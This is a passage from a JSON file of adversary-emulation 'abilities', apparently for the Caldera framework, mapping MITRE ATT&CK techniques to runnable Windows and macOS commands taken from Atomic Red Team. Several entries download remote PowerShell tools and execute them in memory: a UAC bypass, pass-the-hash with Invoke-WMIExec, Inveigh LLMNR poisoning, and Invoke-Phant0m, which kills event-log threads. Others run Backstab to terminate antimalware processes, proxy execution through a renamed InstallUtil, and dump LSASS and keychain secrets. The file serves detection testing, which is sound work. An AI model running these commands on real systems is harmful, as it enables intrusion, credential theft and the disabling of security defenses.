"code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path eaecbe_InstallUtilTestHarness.ps1) -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . eaecbe_InstallUtilTestHarness.ps1; $InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"; $InstallerAssemblyFileName = 'readme.txt'; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"readme.txt\"; $ExpectedOutput = 'Constructor_'; Set-Location \"$Env:windir\\System32\\Tasks\"; Copy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine;     InstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: InstallUtil", "ability_id": "10a8f500acd733bb4732b9a5236d50b2", "technique_id": "T1218.004", "tactic": "defense-evasion", "requirements": [], "name": "InstallUtil evasive invocation", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Determine the version of Internet Explorer running", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Software Discovery", "ability_id": "c9be8043-a445-4cbf-b77b-ed7bb007fc7c", "technique_id": "T1518", "tactic": "discovery", "requirements": [], "name": "Internet Explorer Version", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes a CHM file using the Shortcut Command method with a defined ITS Protocol Handler, and help topic extension.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "ability_id": "ae1510936a20ac31014eb86e5b4944ce", "technique_id": "T1218.001", "tactic": "defense-evasion", "requirements": [], "name": "Invoke CHM Shortcut Command with ITS and Help Topic", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes a CHM file simulating a user double click.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "ability_id": "4c378a952a9235b7aba7f273f3cf4874", "technique_id": "T1218.001", "tactic": "defense-evasion", "requirements": [], "name": "Invoke CHM Simulate Double click", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes a CHM file with the ITS protocol handler.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "ability_id": "5b1aea789aa50c07bb5555dcff5d42a6", "technique_id": "T1218.001", "tactic": "defense-evasion", "requirements": [], "name": "Invoke CHM with InfoTech Storage Protocol Handler", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes a CHM file with a defined script engine, ITS Protocol Handler, and help topic extension.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "ability_id": "627f499ceb32e74b95494141bc680e08", "technique_id": "T1218.001", "tactic": "defense-evasion", "requirements": [], "name": "Invoke CHM with Script Engine and Help Topic", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes a CHM file with the default Shortcut Command method.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "ability_id": "0d2e984bedf73f5266e250d7ecd257cf", "technique_id": "T1218.001", "tactic": "defense-evasion", "requirements": [], "name": "Invoke CHM with default Shortcut Command Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an HTA Application by directly downloading from remote URI.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Mshta", "ability_id": "748882eaad1b31e8f90d9b31692200fe", "technique_id": "T1218.005", "tactic": "defense-evasion", "requirements": [], "name": "Invoke HTML Application - Direct download from URI", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an HTA Application with JScript Engine and Inline Protocol Handler.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Mshta", "ability_id": "35200ef3d7ca094ae2208a1df03ede18", "technique_id": "T1218.005", "tactic": "defense-evasion", "requirements": [], "name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Mshta", "ability_id": "0bb6fa90a458e6512a19d246cfae8843", "technique_id": "T1218.005", "tactic": "defense-evasion", "requirements": [], "name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an HTA Application using JScript script engine simulating double click.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Mshta", "ability_id": "d143172642328567d9d0951cb116e3a2", "technique_id": "T1218.005", "tactic": "defense-evasion", "requirements": [], "name": "Invoke HTML Application - Jscript Engine Simulating Double Click", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an HTA Application using JScript script engine using local UNC path simulating lateral movement.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Mshta", "ability_id": "bf9cc3d98c38f79c948a0f4a7f888034", "technique_id": "T1218.005", "tactic": "defense-evasion", "requirements": [], "name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: Mshta", "ability_id": "c29f0da7c0bf612d30acb64e1d6e9368", "technique_id": "T1218.005", "tactic": "defense-evasion", "requirements": [], "name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "RemoteFXvGPUDisablement.exe is an abusable, signed PowerShell host executable that was introduced in Windows 10 and Server 2019 (OS Build 17763.1339).\n\nOne of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. This atomic test influences RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as \"PowerShell module load-order hijacking\" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable or within a user-specified module directory outside of %PSModulePath%. Upon execution the temporary module is deleted.\n\nInvoke-ATHRemoteFXvGPUDisablementCommand is used in this test to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the \"Disable\" argument to RemoteFXvGPUDisablement.exe.\n\nThe Invoke-ATHRemoteFXvGPUDisablementCommand function outputs all relevant execution-related artifacts.\n\nReference: https://github.com/redcanaryco/AtomicTestHarnesses/blob/master/TestHarnesses/T1218_SignedBinaryProxyExecution/InvokeRemoteFXvGPUDisablementCommand.ps1\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "085858a8aa5ea8e6a810e59c75ea7f6a", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Note: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "d56753da33c882128773634140c0efa5", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Invoke-AppPathBypass", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Downloads random meme and sets as desktop background", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["Invoke-MemeKatz.ps1"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ".\\Invoke-MemeKatz.ps1", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["Invoke-MemeKatz.ps1"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ".\\Invoke-MemeKatz.ps1", "language": null, "name": "pwsh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["Invoke-MemeKatz.ps1"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell.exe -ep bypass -c \"Invoke-MemeKatz.ps1\"", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Defacement", "ability_id": "68235976-2404-42a8-9105-68230cfef562", "technique_id": "T1491", "tactic": "impact", "requirements": [], "name": "Invoke-MemeKatz", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Use Alternate Authentication Material: Pass the Hash", "ability_id": "8ce073cf3170576e1f5c6e4d06e1873a", "technique_id": "T1550.002", "tactic": "multiple", "requirements": [], "name": "Invoke-WMIExec Pass the Hash", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "JScript execution test, execute JScript via cscript command. When successful, system information will be written to $env:TEMP\\T1059.007.out.txt", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["85d52c_sys_info.js"], "parsers": [], "cleanup": ["Remove-Item $env:TEMP\\T1059.007.out.txt -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cscript 85d52c_sys_info.js > $env:TEMP\\T1059.007.out.txt'", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: JavaScript", "ability_id": "d01777fabe1567d53f720d0d4e348c33", "technique_id": "T1059.007", "tactic": "execution", "requirements": [], "name": "JScript execution to gather local computer information via cscript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "JScript execution test, execute JScript via wscript command. When successful, system information will be shown with four message boxes.", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["85d52c_sys_info.js"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "wscript 85d52c_sys_info.js", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: JavaScript", "ability_id": "88210b707791d09a7db8026d521f71b1", "technique_id": "T1059.007", "tactic": "execution", "requirements": [], "name": "JScript execution to gather local computer information via wscript", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "6722535bf5a14b87b5772b739f53321f", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Javascript in registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerates active directory usernames using the userenum function of Kerbrute", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cd $env:temp; .\\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain $env:TEMP\\username.txt", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "25bbb222a91d007fa29ace7c586b418c", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Kerbrute - userenum", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "### Keychain Files\n\n  ~/Library/Keychains/\n\n  /Library/Keychains/\n\n  /Network/Library/Keychains/\n\n  [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)\n\n  [Keychain dumper](https://github.com/juuso/keychaindump)\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "security -h; security find-certificate -a -p > /tmp/certs.pem; security import /tmp/certs.pem -k", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Credentials from Password Stores: Keychain", "ability_id": "59c02702e85383fa2fe0c95c257166de", "technique_id": "T1555.001", "tactic": "credential-access", "requirements": [], "name": "Keychain", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red; Remove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore; $url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"; $output = \"$env:TEMP\\Invoke-Phant0m.ps1\"; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); cd $env:TEMP; Import-Module .\\Invoke-Phant0m.ps1; Invoke-Phant0m", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable Windows Event Logging", "ability_id": "47ba984c0c40a7c41b4797156c1a5f96", "technique_id": "T1562.002", "tactic": "defense-evasion", "requirements": [], "name": "Kill Event Log Service Threads", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "& $env:temp\\Backstab64.exe -k -n MsMpEng.exe", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "6a4f5aca52680eef33a8285782936333", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "Kill antimalware protected processes using Backstab", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1\" -UseBasicParsing); Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay", "ability_id": "5ee8fce78c4cef28c4e6ecebe77bdba4", "technique_id": "T1557.001", "tactic": "multiple", "requirements": [], "name": "LLMNR Poisoning with Inveigh (PowerShell)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["$file1 = \"$env:Temp\\test10.lnk\"; $file2 = \"$env:Temp\\a.exe\"; Remove-Item $file1 -ErrorAction Ignore; Remove-Item $file2 -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Invoke-WebRequest -OutFile $env:Temp\\test10.lnk \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"; $file1 = \"$env:Temp\\test10.lnk\"; Start-Process $file1; Start-Sleep -s 10; taskkill /IM a.exe /F", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "User Execution: Malicious File", "ability_id": "f71199dcf1e307fc37c5a0cb9e4031b9", "technique_id": "T1204.002", "tactic": "execution", "requirements": [], "name": "LNK Payload Download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple useranames and passwords/hashes to the screen.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "pypykatz live lsa", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential 